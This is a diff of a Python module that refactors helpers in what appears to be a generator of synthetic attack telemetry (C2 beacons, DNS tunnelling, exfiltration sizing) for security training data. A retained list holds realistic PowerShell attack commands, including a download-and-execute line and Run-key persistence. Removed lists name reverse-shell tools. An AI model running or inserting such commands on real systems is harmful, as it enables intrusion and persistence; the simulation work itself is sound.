@@ -56,16 +56,12 @@ from evidenceforge.generation.actions import (
     StagedArchiveSmbReadActionBundle,
     StagedArchiveSmbReadRequest,
     WebScanRequest,
-    dns_transport_close_headroom_seconds,
-    network_transport_open_positive_headroom_seconds,
 )
 from evidenceforge.generation.actions.rdp_session import (
     RDP_EXPLICIT_END_CLOSE_GAP_MAX_MILLISECONDS,
     rdp_action_deadline_source_tail,
     rdp_action_deadline_transport_headroom_seconds,
 )
-from evidenceforge.generation.activity.application_catalog import resolve_image_path
-from evidenceforge.generation.activity.dns_txt import choose_background_dns_txt_record
 from evidenceforge.generation.activity.helpers import _get_os_category
 from evidenceforge.generation.activity.http_content import (
     apply_transfer_size_variance,
@@ -76,6 +72,10 @@ from evidenceforge.generation.activity.http_content import (
     response_size_for_status,
 )
 from evidenceforge.generation.activity.network import _is_private_ip
+from evidenceforge.generation.engine.storyline_helpers import http as http_helpers
+from evidenceforge.generation.engine.storyline_helpers import ids as ids_helpers
+from evidenceforge.generation.engine.storyline_helpers import periodic as periodic_helpers
+from evidenceforge.generation.engine.storyline_helpers import process as process_helpers
 from evidenceforge.generation.intent_ledger import IntentSection
 from evidenceforge.generation.storage_world import CompiledStorageFile
 from evidenceforge.generation.world_model import (
@@ -85,9 +85,7 @@ from evidenceforge.generation.world_model import (
     RDP_SOURCE_PROCESS_MIN_LEAD_SECONDS,
 )
 from evidenceforge.models.exceptions import StateError
-from evidenceforge.models.ids import IdsAlertAttachmentSpec
 from evidenceforge.models.scenario import (
-    MAX_HTTP_RESPONSE_BODY_LEN,
     ConnectionEventSpec,
     EventSpacingConfig,
     SmbClientLocation,
@@ -99,12 +97,46 @@ from evidenceforge.utils.time import ensure_utc, parse_duration, parse_iso8601
 
 logger = logging.getLogger(__name__)
 
+# Compatibility imports; execution calls the focused helper owners directly.
+_c2_http_response_size = http_helpers._c2_http_response_size
+_deround_storyline_transfer_size = http_helpers._deround_storyline_transfer_size
+_is_c2_http_request = http_helpers._is_c2_http_request
+_is_exfil_connection_spec = http_helpers._is_exfil_connection_spec
+_is_round_transfer_size = http_helpers._is_round_transfer_size
+_size_storyline_connection = http_helpers._size_storyline_connection
+_storyline_http_response_body_len = http_helpers._storyline_http_response_body_len
+_build_ids_alert_contexts = ids_helpers._build_ids_alert_contexts
+_ids_attachment_ground_truth = ids_helpers._ids_attachment_ground_truth
+_beacon_token_scope = periodic_helpers._beacon_token_scope
+_choose_dns_tunnel_campaign_ttl = periodic_helpers._choose_dns_tunnel_campaign_ttl
+_choose_dns_tunnel_response_template = periodic_helpers._choose_dns_tunnel_response_template
+_choose_dns_tunnel_response_ttl = periodic_helpers._choose_dns_tunnel_response_ttl
+_dns_periodic_exclusive_start_fence = periodic_helpers._dns_periodic_exclusive_start_fence
+_dns_tunnel_background_txt_record = periodic_helpers._dns_tunnel_background_txt_record
+_dns_tunnel_extra_labels = periodic_helpers._dns_tunnel_extra_labels
+_entry_value = periodic_helpers._entry_value
+_iter_dns_tunnel_ticks = periodic_helpers._iter_dns_tunnel_ticks
+_iter_periodic_ticks = periodic_helpers._iter_periodic_ticks
+_range_or_value = periodic_helpers._range_or_value
+_render_beacon_template = periodic_helpers._render_beacon_template
+_render_dns_tunnel_response_template = periodic_helpers._render_dns_tunnel_response_template
+_weighted_profile_entry = periodic_helpers._weighted_profile_entry
+_IPV4_LITERAL_RE = process_helpers._IPV4_LITERAL_RE
+_LONG_RUNNING_EXES = process_helpers._LONG_RUNNING_EXES
+_LONG_RUNNING_PATTERNS = process_helpers._LONG_RUNNING_PATTERNS
+_MEDIUM_COMMANDS = process_helpers._MEDIUM_COMMANDS
+_SHORT_COMMANDS = process_helpers._SHORT_COMMANDS
+_estimate_process_lifetime = process_helpers._estimate_process_lifetime
+_extract_sc_create_service_start_type = process_helpers._extract_sc_create_service_start_type
+_extract_schtasks_option = process_helpers._extract_schtasks_option
+_linux_shell_process_command_line = process_helpers._linux_shell_process_command_line
+_normalize_storyline_process_image = process_helpers._normalize_storyline_process_image
+
 
 _MAX_EMBEDDED_COMMAND_B64_CHARS = 16_384
 _AUTHORED_EVENT_MAX_EARLY_JITTER_SECONDS = 30.0
 _AUTHORED_RDP_FRONTIER_EPSILON = timedelta(microseconds=1)
 _STORYLINE_SHELL_TEMPLATE_FORMATTER = string.Formatter()
-_IPV4_LITERAL_RE = re.compile(r"\d{1,3}(?:\.\d{1,3}){3}")
 _POWERSHELL_WEB_CMDLET_USER_AGENT = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) WindowsPowerShell/5.1"
 )
@@ -130,79 +162,6 @@ _HTTP_USER_AGENT_OVERRIDE_PATTERNS = (
         """
     ),
 )
-
-
-def _build_ids_alert_contexts(
-    attachments: Sequence[IdsAlertAttachmentSpec],
-    *,
-    time: datetime,
-    src_ip: str,
-    dst_ip: str,
-    dst_port: int,
-    proto: str,
-    rng: random.Random,
-    source: str,
-) -> list[Any]:
-    """Resolve authored SID references into canonical IDS contexts."""
-
-    if not attachments:
-        return []
-    from evidenceforge.generation.activity.ids_signatures import signature_by_sid
-
-    contexts = []
-    for attachment in attachments:
-        signature = signature_by_sid(attachment.sid)
-        if signature is None:
-            raise ValueError(
-                f"Unknown IDS signature SID {attachment.sid}; add it to ids_signatures.yaml"
-            )
-        contexts.append(
-            IdsAlertActionBundle(
-                IdsAlertRequest(
-                    signature=signature,
-                    time=time,
-                    src_ip=src_ip,
-                    dst_ip=dst_ip,
-                    dst_port=dst_port,
-                    proto=proto,
-                    rng=rng,
-                    source=source,
-                    direction=str(signature.get("direction", "")),
-                    policy=attachment.policy,
-                    origin="authored_attachment",
-                )
-            ).execute()
-        )
-    return contexts
-
-
-def _ids_attachment_ground_truth(
-    attachments: Sequence[IdsAlertAttachmentSpec],
-) -> list[dict[str, Any]]:
-    """Describe effective attachment policies before sensor totals are finalized."""
-    from evidenceforge.generation.activity.ids_signatures import (
-        effective_alert_policy,
-        signature_by_sid,
-    )
-
-    result = []
-    for attachment in attachments:
-        signature = signature_by_sid(attachment.sid)
-        if signature is None:
-            continue
-        policy = effective_alert_policy(signature, attachment.policy)
-        result.append(
-            {
-                "sid": attachment.sid,
-                "effective_policy": (
-                    "every" if policy is None else policy.model_dump(mode="json", exclude_none=True)
-                ),
-                "candidate": 0,
-                "emitted": 0,
-                "policy_filtered": 0,
-            }
-        )
-    return result
 
 
 _NET_USER_ADD_WITH_PASSWORD_RE = re.compile(
@@ -380,13 +339,6 @@ def _linux_storyline_shell_friction_commands(
     return commands
 
 
-def _is_exfil_connection_spec(spec: Any) -> bool:
-    """Return True when a storyline connection describes exfiltration."""
-    desc = (spec.description or "").lower()
-    tech = (spec.technique or "").lower()
-    return "exfil" in desc or "t1041" in tech or "t1048" in tech
-
-
 def _process_owns_storyline_multipart_upload(
     process: Any,
     image: str,
@@ -419,427 +371,6 @@ def _process_owns_storyline_multipart_upload(
 
     collect(getattr(multipart, "parts", ()))
     return bool(local_paths) and all(path.casefold() in command_lower for path in local_paths)
-
-
-def _is_c2_http_request(
-    *,
-    description: str | None,
-    technique: str | None,
-    uri: str | None,
-    activity: str | None = None,
-) -> bool:
-    """Return True when a storyline HTTP request should look like C2/tasking."""
-    uri_l = (uri or "").lower()
-    text = f"{description or ''} {technique or ''} {activity or ''} {uri_l}".lower()
-    text_markers = (
-        "c2",
-        "beacon",
-        "callback",
-        "checkin",
-        "tasking",
-        "command and control",
-        "t1041",
-        "t1071",
-    )
-    path_markers = (
-        "/v2/",
-        "/callback",
-        "/checkin",
-        "/beacon",
-        "/task",
-        "/cmd",
-        "/gate",
-    )
-    return any(marker in text for marker in text_markers) or any(
-        marker in uri_l for marker in path_markers
-    )
-
-
-def _c2_http_response_size(rng: random.Random, *, method: str, uri: str) -> int:
-    """Return varied source-native response body sizes for C2-like HTTP requests."""
-    method_u = method.upper()
-    uri_l = uri.lower()
-    if method_u == "POST":
-        return rng.randint(160, 2600)
-    if any(marker in uri_l for marker in ("/status", "/check", "/heartbeat", "/ping")):
-        band = rng.choices(["ack", "config", "task"], weights=[55, 34, 11], k=1)[0]
-        if band == "ack":
-            return rng.randint(90, 1800)
-        if band == "config":
-            return rng.randint(2400, 14500)
-        return rng.randint(18_000, 86_000)
-    if any(marker in uri_l for marker in ("/client", "/stage", "/update", "/loader")):
-        return rng.randint(8_000, 94_000)
-    return rng.randint(220, 11_000)
-
-
-def _is_round_transfer_size(value: int) -> bool:
-    """Return True for large human-authored round byte counts."""
-    if value < 1_000_000:
-        return False
-    binary_mib = 1024 * 1024
-    decimal_mb = 1000 * 1000
-    return value % binary_mib == 0 or value % decimal_mb == 0 or value & (value - 1) == 0
-
-
-def _deround_storyline_transfer_size(value: int, rng) -> int:
-    """Add archive/package variance so exfil sizes do not land on exact MB boundaries."""
-    delta_min = max(32_768, value // 250)
-    delta_max = max(delta_min + 1, value // 25)
-    delta = rng.randint(delta_min, delta_max) + rng.randint(137, 8191)
-    if value - delta > 1_000_000 and rng.random() < 0.35:
-        adjusted = value - delta
-    else:
-        adjusted = value + delta
-    if _is_round_transfer_size(adjusted):
-        adjusted += rng.randint(139, 8191)
-    return adjusted
-
-
-def _size_storyline_connection(
-    spec,
-    rng,
-) -> tuple[int, int]:
-    """Determine orig_bytes/resp_bytes for a storyline connection.
-
-    Priority:
-    1. Explicit spec values (author override)
-    2. Heuristic sizing based on technique/description keywords
-    3. Default bidirectional range
-    """
-    ob = spec.orig_bytes
-    rb = spec.resp_bytes
-
-    desc = (spec.description or "").lower()
-    tech = (spec.technique or "").lower()
-
-    is_exfil = _is_exfil_connection_spec(spec)
-    is_c2 = "c2" in desc or "callback" in desc or "beacon" in desc or "t1071" in tech
-    is_download = "download" in desc or "stage" in desc or "t1105" in tech
-
-    if ob is not None and is_exfil and _is_round_transfer_size(ob):
-        ob = _deround_storyline_transfer_size(ob, rng)
-
-    if ob is None:
-        if is_exfil:
-            ob = rng.randint(1_000_000, 50_000_000)  # 1-50 MB
-        elif is_c2:
-            ob = rng.randint(500, 5_000)
-        elif is_download:
-            ob = rng.randint(200, 2_000)
-        else:
-            ob = rng.randint(1_000, 10_000)
-
-    if rb is None:
-        if is_exfil:
-            rb = rng.randint(200, 5_000)  # small ACK/response
-        elif is_c2:
-            rb = rng.randint(1_000, 10_000)  # tasking payload
-        elif is_download:
-            rb = rng.randint(50_000, 5_000_000)  # 50KB-5MB payload
-        else:
-            rb = rng.randint(5_000, 50_000)
-
-    return ob, rb
-
-
-def _storyline_http_response_body_len(
-    *,
-    spec: Any,
-    rng: random.Random,
-    method: str,
-    uri: str,
-    host: str,
-    is_c2_http: bool,
-    use_connection_path_hints: bool,
-) -> int:
-    """Return the body size rendered by web/proxy access logs for authored HTTP."""
-    method_upper = method.upper()
-    status_code = spec.status_code or 200
-    uri_lower = uri.lower()
-
-    if method_upper == "HEAD":
-        return 0
-    if spec.response_body_len is not None:
-        return min(max(0, spec.response_body_len), MAX_HTTP_RESPONSE_BODY_LEN)
-    if spec.resp_bytes is not None:
-        return min(max(0, spec.resp_bytes), MAX_HTTP_RESPONSE_BODY_LEN)
-    if status_code >= 300 or status_code in {204, 304}:
-        return response_size_for_status(status_code, host, uri)
-    if (
-        use_connection_path_hints
-        and method_upper == "POST"
-        and any(kw in uri_lower for kw in ("/upload", "/submit", "/api", "/beacon"))
-    ):
-        return rng.randint(200, 2000)
-    if (
-        use_connection_path_hints
-        and method_upper == "GET"
-        and any(kw in uri_lower for kw in ("/callback", "/task", "/cmd", "/beacon", "/gate"))
-    ):
-        return rng.randint(500, 5000)
-    if is_c2_http:
-        return _c2_http_response_size(rng, method=method, uri=uri)
-    if method_upper == "POST":
-        return rng.randint(200, 5000) if use_connection_path_hints else rng.randint(200, 2000)
-    return response_size_for_status(status_code, host, uri)
-
-
-def _iter_periodic_ticks(
-    start_time: datetime,
-    interval_sec: float,
-    duration_sec: float | None,
-    count: int | None,
-    jitter: float,
-    rng,
-    *,
-    exclusive_end_time: datetime | None = None,
-):
-    """Yield timestamps for periodic bulk events.
-
-    Shared timing engine for beacon, web_scan, credential_spray, dga_queries,
-    dns_tunnel, and any future periodic event types.
-
-    Args:
-        start_time: First event timestamp.
-        interval_sec: Seconds between events.
-        duration_sec: Total campaign length in seconds (None when using count).
-        count: Exact number of events to emit (None when using duration).
-        jitter: Fraction of interval to randomize (0.0–1.0).
-        rng: Random number generator instance.
-        exclusive_end_time: Optional scenario fence. Ticks that cannot land
-            before this timestamp are not sampled; later candidates are not yielded.
-
-    Yields:
-        datetime for each tick.
-    """
-    t = 0.0
-    emitted = 0
-    end_time = start_time + timedelta(seconds=duration_sec) if duration_sec is not None else None
-    exclusive_fence = ensure_utc(exclusive_end_time) if exclusive_end_time is not None else None
-    if exclusive_fence is not None and ensure_utc(start_time) >= exclusive_fence:
-        return
-    last_tick = None
-    while True:
-        if duration_sec is not None and t > duration_sec:
-            break
-        if count is not None and emitted >= count:
-            break
-        earliest_tick = start_time + timedelta(seconds=max(0.0, t - jitter * interval_sec))
-        if exclusive_fence is not None and ensure_utc(earliest_tick) >= exclusive_fence:
-            break
-        jitter_offset = rng.uniform(-jitter * interval_sec, jitter * interval_sec)
-        tick_time = start_time + timedelta(seconds=max(0.0, t + jitter_offset))
-        # Clamp to the inclusive campaign end (jitter can push past duration).
-        if end_time is not None and tick_time > end_time:
-            tick_time = end_time
-        # Ensure monotonic ordering (jitter can cause inversions)
-        if last_tick is not None and tick_time < last_tick:
-            tick_time = last_tick + timedelta(milliseconds=1)
-        if exclusive_fence is not None and ensure_utc(tick_time) >= exclusive_fence:
-            break
-        last_tick = tick_time
-        yield tick_time
-        emitted += 1
-        t += interval_sec
-
-
-def _iter_dns_tunnel_ticks(
-    start_time: datetime,
-    interval_sec: float,
-    duration_sec: float | None,
-    count: int | None,
-    jitter: float,
-    rng,
-    *,
-    exclusive_end_time: datetime | None = None,
-):
-    """Yield DNS tunnel timestamps with transactional pauses, skips, and pacing.
-
-    A campaign that admits no paced tick restores its owner RNG so terminal
-    boundary rejection cannot perturb later storyline choices.
-    """
-    end_time = start_time + timedelta(seconds=duration_sec) if duration_sec is not None else None
-    exclusive_fence = ensure_utc(exclusive_end_time) if exclusive_end_time is not None else None
-    pause_offset = 0.0
-    initial_rng_state = rng.getstate()
-    admitted_any = False
-    try:
-        for tick_index, tick_time in enumerate(
-            _iter_periodic_ticks(
-                start_time,
-                interval_sec,
-                duration_sec,
-                count,
-                jitter,
-                rng,
-                exclusive_end_time=exclusive_fence,
-            )
-        ):
-            if tick_index > 0 and rng.random() < 0.045:
-                pause_offset += rng.uniform(interval_sec * 4.0, interval_sec * 26.0)
-            if tick_index > 0 and rng.random() < 0.055:
-                continue
-            local_spacing = rng.expovariate(1.0 / max(interval_sec * 0.55, 0.001))
-            if tick_index > 0 and rng.random() < 0.11:
-                local_spacing += rng.uniform(interval_sec * 1.4, interval_sec * 6.5)
-            paced_time = tick_time + timedelta(seconds=pause_offset + local_spacing)
-            if end_time is not None and paced_time > end_time:
-                break
-            if exclusive_fence is not None and ensure_utc(paced_time) >= exclusive_fence:
-                break
-            admitted_any = True
-            yield paced_time
-    finally:
-        if not admitted_any:
-            rng.setstate(initial_rng_state)
-
-
-def _dns_periodic_exclusive_start_fence(
-    activity_generator: Any,
-    *,
-    window_start: datetime,
-    exclusive_end_time: datetime | None,
-    maximum_rtt_seconds: float,
-) -> datetime | None:
-    """Return the allocation-free exclusive fence for a fully rendered DNS request.
-
-    The canonical bound composes the transport-open displacement with DNS RTT and
-    teardown. The source tail uses every configured sensor route; checking both ends
-    of the canonical window bounds each profile's affine clock-drift adjustment.
-    """
-
-    if exclusive_end_time is None:
-        return None
-    canonical_headroom = timedelta(
-        seconds=(
-            network_transport_open_positive_headroom_seconds()
-            + dns_transport_close_headroom_seconds(
-                caller_rtt_maximum=maximum_rtt_seconds,
-            )
-        )
-    )
-    exclusive_fence = ensure_utc(exclusive_end_time)
-    source_tail = timedelta(0)
-    network_observation_planner = getattr(
-        getattr(activity_generator, "dispatcher", None),
-        "network_observation_planner",
-        None,
-    )
-    resolve_source_tail = getattr(
-        network_observation_planner,
-        "network_sensor_close_positive_headroom",
-        None,
-    )
-    if callable(resolve_source_tail):
-        earliest_close = min(
-            ensure_utc(window_start) + canonical_headroom,
-            exclusive_fence,
-        )
-        candidates = tuple(
-            resolve_source_tail(
-                canonical_time,
-                protocol="udp",
-                conn_state="SF",
-                payload_bytes=1,
-            )
-            for canonical_time in (earliest_close, exclusive_fence)
-        )
-        if any(
-            type(candidate) is not timedelta or candidate < timedelta(0) for candidate in candidates
-        ):
-            raise ValueError("DNS source-close planner returned an invalid positive headroom")
-        source_tail = max(candidates, default=timedelta(0))
-    return exclusive_fence - canonical_headroom - source_tail
-
-
-def _range_or_value(value: int | list[int] | None, rng: random.Random) -> int | None:
-    """Resolve a fixed byte value or [lo, hi] range."""
-    if value is None:
-        return None
-    if isinstance(value, int):
-        return value
-    return rng.randint(value[0], value[1])
-
-
-def _beacon_token_scope(spec: Any, system: System) -> dict[str, str]:
-    """Return stable per-campaign token values for beacon URI templates."""
-    host_key = f"{system.hostname}:{getattr(system, 'ip', '')}"
-    campaign_key = f"{spec.profile or ''}:{spec.hostname or ''}:{spec.dst_ip}:{spec.dst_port}"
-    return {
-        "host_id": f"{_stable_seed('beacon-host:' + host_key) & 0xFFFFFFFF:08x}",
-        "campaign_id": f"{_stable_seed('beacon-campaign:' + campaign_key) & 0xFFFFFFFF:08x}",
-    }
-
-
-def _render_beacon_template(
-    template: str,
-    *,
-    spec: Any,
-    system: System,
-    tick_index: int,
-) -> str:
-    """Render deterministic, synthetic-safe beacon URI template tokens."""
-    scope = _beacon_token_scope(spec, system)
-    rng = random.Random(
-        _stable_seed(
-            f"beacon-template:{system.hostname}:{spec.hostname or spec.dst_ip}:"
-            f"{spec.dst_port}:{tick_index}:{template}"
-        )
-    )
-    rendered = template.replace("{host_id}", scope["host_id"])
-    rendered = rendered.replace("{campaign_id}", scope["campaign_id"])
-    rendered = rendered.replace("{tick}", str(tick_index))
-    while "{hex8}" in rendered:
-        rendered = rendered.replace("{hex8}", f"{rng.getrandbits(32):08x}", 1)
-    while "{guid}" in rendered:
-        rendered = rendered.replace(
-            "{guid}",
-            stable_uuid(
-                "beacon-guid",
-                system.hostname,
-                spec.hostname or spec.dst_ip,
-                tick_index,
-                rng.getrandbits(64),
-            ),
-            1,
-        )
-
-    def _base64url(match: re.Match[str]) -> str:
-        length = int(match.group(1))
-        raw = bytes(rng.getrandbits(8) for _ in range(max(1, length)))
-        token = base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")
-        return token[:length]
-
-    rendered = re.sub(r"\{base64url:(\d{1,3})\}", _base64url, rendered)
-    return rendered
-
-
-def _entry_value(entry: Any, field: str) -> Any:
-    """Read a sequence entry field from either a Pydantic model or config dict."""
-    if isinstance(entry, dict):
-        return entry.get(field)
-    return getattr(entry, field, None)
-
-
-def _weighted_profile_entry(
-    entries: list[dict[str, Any]],
-    *,
-    tick_index: int,
-    spec: Any,
-    system: System,
-) -> dict[str, Any] | None:
-    """Choose one profile entry using deterministic per-tick weighted selection."""
-    if not entries:
-        return None
-    rng = random.Random(
-        _stable_seed(
-            f"beacon-profile-entry:{system.hostname}:{spec.profile}:"
-            f"{spec.hostname or spec.dst_ip}:{tick_index}"
-        )
-    )
-    weights = [float(entry.get("weight", 1.0) or 1.0) for entry in entries]
-    return rng.choices(entries, weights=weights, k=1)[0]
 
 
 def _storyline_event_offsets(
@@ -907,84 +438,12 @@ def _storyline_session_required_until(
             continue
         process_name = str(getattr(future_spec, "process_name", "") or "")
         command_line = str(getattr(future_spec, "command_line", "") or process_name)
-        lifetime = _estimate_process_lifetime(process_name, command_line)
+        lifetime = process_helpers._estimate_process_lifetime(process_name, command_line)
         if lifetime is not None:
             # Same-shell child execution is serialized. Its maximum modeled
             # lifetime contributes to when later authored children may start.
             process_tail_seconds += lifetime[1] + 2.0
     return event_time + timedelta(seconds=remaining_seconds + process_tail_seconds)
-
-
-def _choose_dns_tunnel_campaign_ttl(
-    ttl_choices: list[tuple[int, float]],
-    rng: random.Random,
-) -> int:
-    """Choose the dominant response TTL for one DNS tunnel campaign."""
-    values = [value for value, _weight in ttl_choices]
-    weights = [weight for _value, weight in ttl_choices]
-    return int(rng.choices(values, weights=weights, k=1)[0])
-
-
-def _choose_dns_tunnel_response_ttl(
-    ttl_choices: list[tuple[int, float]],
-    campaign_ttl: int,
-    rng: random.Random,
-) -> float:
-    """Pick a source-native DNS tunnel response TTL with campaign-level skew."""
-    roll = rng.random()
-    if roll < 0.55:
-        return float(campaign_ttl)
-
-    near_distance = max(2, min(15, campaign_ttl or 2))
-    nearby_ttls = [
-        value
-        for value, _weight in ttl_choices
-        if value != campaign_ttl and abs(value - campaign_ttl) <= near_distance
-    ]
-    if roll < 0.78 and nearby_ttls:
-        return float(rng.choice(nearby_ttls))
-
-    values = [value for value, _weight in ttl_choices]
-    weights = [weight for _value, weight in ttl_choices]
-    return float(rng.choices(values, weights=weights, k=1)[0])
-
-
-def _choose_dns_tunnel_response_template(
-    templates: list[str],
-    primary_template: str,
-    secondary_templates: list[str],
-    rng: random.Random,
-) -> str:
-    """Choose a DNS tunnel response template with family-level stickiness."""
-    roll = rng.random()
-    if roll < 0.46:
-        return primary_template
-    if roll < 0.82 and secondary_templates:
-        return rng.choice(secondary_templates)
-    return rng.choice(templates)
-
-
-def _render_dns_tunnel_response_template(
-    template: str,
-    *,
-    token: str,
-    query_count: int,
-    ttl: float,
-    rng: random.Random,
-) -> str:
-    """Render a DNS tunnel TXT answer template using deterministic local values."""
-    edge_hint = f"{rng.choice(('a', 'b', 'c', 'd', 'e', 'n', 'x'))}{rng.randint(1, 99)}"
-    replacements = {
-        "{token}": token,
-        "{seq}": str(query_count),
-        "{seq_hex}": f"{query_count & 0xFFFF:x}",
-        "{edge}": edge_hint,
-        "{ttl}": str(int(ttl)),
-    }
-    rendered = template
-    for placeholder, value in replacements.items():
-        rendered = rendered.replace(placeholder, value)
-    return rendered
 
 
 def _effective_rate_interval(rate: float, count: int | None, rng) -> float:
@@ -1223,33 +682,6 @@ def _web_scan_uri_with_runtime_variation(uri: str, request_count: int, rng) -> s
     return f"{uri}{separator}{param}={value}"
 
 
-def _dns_tunnel_extra_labels(query_count: int, rng) -> list[str]:
-    """Return optional DNS tunnel labels that make query grammar less uniform."""
-    roll = rng.random()
-    if roll < 0.34:
-        return []
-    edge = f"{rng.choice(('a', 'b', 'c', 'd', 'e', 'n', 'x', 'u'))}{rng.randint(1, 99)}"
-    region = rng.choice(("iad", "ord", "dfw", "sjc", "lax", "atl", "ewr"))
-    if roll < 0.54:
-        return [edge]
-    if roll < 0.72:
-        return [rng.choice(("cdn", "api", "img", "edge", "r", region)), edge]
-    if roll < 0.86:
-        return [f"s{query_count & 0xFFFF:x}", rng.choice(("a", "b", "r", region))]
-    if roll < 0.95:
-        return [edge, f"r{rng.randint(1, 12)}", rng.choice(("cdn", "cache", "svc", region))]
-    return [
-        rng.choice(("api", "cdn", "assets", "edge")),
-        region,
-        f"n{rng.randint(1, 7)}",
-    ]
-
-
-def _dns_tunnel_background_txt_record(rng: random.Random) -> tuple[str, str, int]:
-    """Return a benign TXT query/answer that can collide with tunnel-era DNS."""
-    return choose_background_dns_txt_record(rng)
-
-
 def _web_scan_path_allows_referrer(path_entry: dict[str, Any]) -> bool:
     """Return whether a scanner path plausibly carries a crawl Referer."""
     uri = str(path_entry.get("uri", ""))
@@ -1267,34 +699,6 @@ def _web_scan_path_allows_referrer(path_entry: dict[str, Any]) -> bool:
     return not uri.lower().startswith(suspicious_prefixes)
 
 
-def _normalize_storyline_process_image(
-    process_name: str,
-    os_category: str,
-    username: str = "",
-) -> str:
-    """Normalize a storyline executable to the canonical full path when possible."""
-    if "\\" in process_name or "/" in process_name:
-        return process_name
-    return resolve_image_path(process_name, os_category, username=username)
-
-
-def _linux_shell_process_command_line(process_name: str, command_line: str) -> str | None:
-    """Return an explicit shell invocation for Linux shell process specs."""
-    exe = process_name.rsplit("/", 1)[-1].lower()
-    if exe not in {"bash", "dash", "sh", "zsh"}:
-        return None
-    try:
-        parts = shlex.split(command_line, comments=False, posix=True)
-    except ValueError:
-        parts = command_line.split()
-    if not parts:
-        return f"{exe} -c ''"
-    first = parts[0].rsplit("/", 1)[-1].lower()
-    if first == exe:
-        return command_line
-    return f"{exe} -c {shlex.quote(command_line)}"
-
-
 # Realistic decoded PowerShell commands for base64 encoding
 POWERSHELL_COMMANDS = [
     "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')",
@@ -1309,242 +713,6 @@ POWERSHELL_COMMANDS = [
     "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value 'powershell.exe -w hidden -ep bypass -f C:\\Users\\Public\\update.ps1'",
 ]
 
-# ── Story process lifetime estimation ──────────────────────────────────
-# Returns (min_seconds, max_seconds) or None for long-running (no termination).
-
-_SHORT_COMMANDS: set[str] = {
-    # Windows recon
-    "whoami",
-    "whoami.exe",
-    "ipconfig",
-    "ipconfig.exe",
-    "hostname",
-    "hostname.exe",
-    "systeminfo",
-    "systeminfo.exe",
-    "tasklist",
-    "tasklist.exe",
-    "nltest",
-    "nltest.exe",
-    "dir",
-    "type",
-    "findstr",
-    "findstr.exe",
-    "reg",
-    "reg.exe",
-    "net.exe",
-    "net1.exe",
-    "net",
-    "net1",
-    "query",
-    "klist",
-    "klist.exe",
-    "nslookup",
-    "nslookup.exe",
-    "netstat",
-    "netstat.exe",
-    "arp",
-    "arp.exe",
-    "route",
-    "route.exe",
-    "qwinsta",
-    "qwinsta.exe",
-    "dsquery",
-    "dsquery.exe",
-    # Linux recon
-    "id",
-    "uname",
-    "ifconfig",
-    "cat",
-    "ls",
-    "ps",
-    "ss",
-    "find",
-    "grep",
-    "awk",
-    "head",
-    "tail",
-    "wc",
-    "env",
-    "printenv",
-    "df",
-    "mount",
-    "w",
-    "last",
-    "ip",
-    "hostnamectl",
-}
-
-_MEDIUM_COMMANDS: set[str] = {
-    "powershell.exe",
-    "powershell",
-    "pwsh",
-    "certutil",
-    "certutil.exe",
-    "bitsadmin",
-    "bitsadmin.exe",
-    "wmic",
-    "wmic.exe",
-    "schtasks",
-    "schtasks.exe",
-    "sc",
-    "sc.exe",
-    "mshta",
-    "mshta.exe",
-    "cscript",
-    "cscript.exe",
-    "wscript",
-    "wscript.exe",
-    "rundll32",
-    "rundll32.exe",
-    "cmd.exe",
-    "cmd",  # cmd itself is medium; the inner command may be short
-    "msbuild",
-    "msbuild.exe",
-    "regsvr32",
-    "regsvr32.exe",
-    # Linux attack tools
-    "curl",
-    "wget",
-    "python",
-    "python3",
-    "perl",
-    "ruby",
-    "mysqldump",
-    "pg_dump",
-    "tar",
-    "gzip",
-    "zip",
-    "scp",
-}
-
-# Patterns in command_line that indicate long-running / persistent processes
-_LONG_RUNNING_PATTERNS: list[str] = [
-    "TCPClient",
-    "TCPListener",
-    "$s.Read",
-    "ncat",
-    "socat",
-    "nc -l",
-    "nc.exe -l",
-    "meterpreter",
-    "beacon",
-    "reverse_tcp",
-    "bind_tcp",
-    "-persist",
-    "--keep-alive",
-    "while(true)",
-    "while True",
-    "Start-Sleep -Seconds 99",
-    "tail -f",
-]
-
-_LONG_RUNNING_EXES: set[str] = {
-    "mstsc.exe",
-    "mstsc",
-    "rdpclip.exe",
-    "rdpclip",
-    "healthmonitorsvc.exe",
-    "ncat",
-    "ncat.exe",
-    "nc",
-    "nc.exe",
-    "socat",
-}
-
-
-def _estimate_process_lifetime(process_name: str, command_line: str) -> tuple[float, float] | None:
-    """Estimate how long a story process should run before terminating.
-
-    Returns (min_seconds, max_seconds) for the termination delay,
-    or None if the process should be left running (long-lived/persistent).
-    """
-    # Extract bare executable name
-    if "\\" in process_name:
-        exe = process_name.rsplit("\\", 1)[-1].lower()
-    elif "/" in process_name:
-        exe = process_name.rsplit("/", 1)[-1].lower()
-    else:
-        exe = process_name.lower()
-
-    if exe == "psexesvc.exe":
-        return (8.0, 45.0)
-
-    # Check long-running first
-    if exe in _LONG_RUNNING_EXES:
-        return None
-    cl_lower = command_line.lower()
-    for pattern in _LONG_RUNNING_PATTERNS:
-        if pattern.lower() in cl_lower:
-            return None
-
-    # For cmd.exe /c, classify based on the inner command
-    if exe in ("cmd.exe", "cmd") and "/c " in cl_lower:
-        inner = cl_lower.split("/c ", 1)[1].strip()
-        inner_exe = inner.split()[0] if inner else ""
-        # Strip path from inner exe
-        if "\\" in inner_exe:
-            inner_exe = inner_exe.rsplit("\\", 1)[-1]
-        elif "/" in inner_exe:
-            inner_exe = inner_exe.rsplit("/", 1)[-1]
-        if inner_exe in _SHORT_COMMANDS:
-            return (0.3, 3.0)
-        if inner_exe in _MEDIUM_COMMANDS:
-            return (3.0, 20.0)
-
-    if exe in _SHORT_COMMANDS:
-        return (0.3, 5.0)
-    if exe in _MEDIUM_COMMANDS:
-        return (5.0, 30.0)
-
-    # Default: medium-lived unknown command
-    return (2.0, 15.0)
-
-
-def _extract_schtasks_option(command_line: str, option: str) -> str:
-    """Extract a quoted or bare schtasks.exe option value."""
-    if not command_line:
-        return ""
-    option_name = option.lstrip("/")
-    match = re.search(
-        rf'(?:^|\s)/{re.escape(option_name)}\s+(?:"(?P<quoted>[^"]*)"|(?P<bare>\S+))',
-        command_line,
-        flags=re.IGNORECASE,
-    )
-    if match is None:
-        return ""
-    return (match.group("quoted") or match.group("bare") or "").strip()
-
-
-def _extract_sc_create_service_start_type(command_line: str) -> tuple[str, str] | None:
-    """Extract service name and native start type from an sc.exe create command."""
